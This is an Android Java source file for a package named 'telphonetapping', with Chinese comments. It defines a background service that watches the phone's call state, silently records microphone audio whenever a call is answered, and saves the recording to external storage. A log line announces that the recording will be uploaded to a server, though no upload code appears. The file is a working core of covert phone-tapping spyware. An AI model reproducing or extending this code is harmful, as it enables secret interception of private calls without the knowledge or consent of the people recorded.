package com.example.telphonetapping;

import java.io.File;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

public class PhoneListenerService extends Service {
	// 电话管理器
	private TelephonyManager tm;
	private MyListener myListener;
	// 定义录音变量
	private MediaRecorder mrRecorder;

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		/**
		 * 后台监听电话的呼叫状态
		 */
		tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
		myListener = new MyListener();
		tm.listen(myListener, PhoneStateListener.LISTEN_CALL_STATE);
		super.onCreate();
	}

	/**
	 * 内部类实现监听电话呼叫状态
	 * 
	 * @author Tiny
	 * 
	 */
	class MyListener extends PhoneStateListener {
		// 监听电话的呼叫状态变化
		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			// TODO Auto-generated method stub
			super.onCallStateChanged(state, incomingNumber);
			try {
				switch (state) {
				case TelephonyManager.CALL_STATE_IDLE:// 空闲状态
					if (mrRecorder != null) {
						mrRecorder.stop();
						mrRecorder.release();
						mrRecorder = null;
						System.out.println("录制完毕，上传服务器");
					}
					break;
				case TelephonyManager.CALL_STATE_RINGING:// 铃响状态

					break;
				case TelephonyManager.CALL_STATE_OFFHOOK:// 通话状态
					/**
					 * 录音
					 */
					mrRecorder = new MediaRecorder();
					mrRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
					mrRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
					String path = new File(Environment
							.getExternalStorageDirectory(), System
							.currentTimeMillis() + ".3gp").getAbsolutePath();
					System.out.println("***************"+path);
					mrRecorder.setOutputFile(path);
					mrRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
					mrRecorder.prepare();
					mrRecorder.start();
					System.out.println("正在录音");
					break;
				default:
					break;
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
		// 取消电话监听
		tm.listen(myListener, PhoneStateListener.LISTEN_NONE);
		myListener = null;
	}

}
